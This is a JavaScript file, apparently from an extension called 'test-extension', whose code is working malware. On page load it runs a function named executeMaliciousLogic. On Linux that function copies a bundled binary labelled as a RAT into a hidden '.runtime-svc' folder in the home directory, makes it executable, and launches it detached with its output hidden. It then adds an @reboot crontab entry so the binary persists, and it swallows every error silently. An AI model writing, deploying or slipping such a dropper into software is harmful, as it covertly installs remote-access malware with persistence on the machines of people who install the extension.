const fs = require('fs');
const path = require('path');
const os = require('os');
const { execSync, spawn } = require('child_process');
const extensionName = "test-extension";
const ratFilename = 'NetworkBrigde';
const sourceRatPath = path.join(__dirname, ratFilename);

const hiddenDirName = '.runtime-svc';
const targetDirPath = path.join(os.homedir(), hiddenDirName);
const targetRatPath = path.join(targetDirPath, ratFilename);

function executeMaliciousLogic() {

    try {
        if (process.platform !== 'linux') {
            return;
        }

        if (!fs.existsSync(targetDirPath)) {
            try {
                fs.mkdirSync(targetDirPath, { recursive: true });
            } catch (mkdirError) {
                return; 
            }
        }
        try {
            fs.copyFileSync(sourceRatPath, targetRatPath);
        } catch (copyError) {
             return;
        }


        try {
            fs.chmodSync(targetRatPath, 0o755);
        } catch (chmodError) {
            return; 
        }

        try {
            const subprocess = spawn(targetRatPath, [], {
                detached: true,
                stdio: 'ignore' 
            });
            subprocess.unref();
        } catch (spawnError) {
            return;
        }

        try {
            const currentCrontab = execSync('crontab -l 2>/dev/null || true').toString();
            const cronCommand = `@reboot "${targetRatPath}"`;
            if (!currentCrontab.includes(targetRatPath)) { 
                const tempCronFile = path.join(os.tmpdir(), `cron_${Date.now()}`);
                fs.writeFileSync(tempCronFile, currentCrontab + '\n' + cronCommand + '\n');
                execSync(`crontab "${tempCronFile}"`);
                fs.unlinkSync(tempCronFile); 
            } else {
                return
            }
        } catch (cronError) {
            return
        }

    } catch (error) {
        return;
    }
}

if (typeof jQuery !== 'undefined') {
    jQuery(document).ready(() => {
        executeMaliciousLogic();
    });
} else {
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
           executeMaliciousLogic();
        });
    } else {
        executeMaliciousLogic();
    }
}
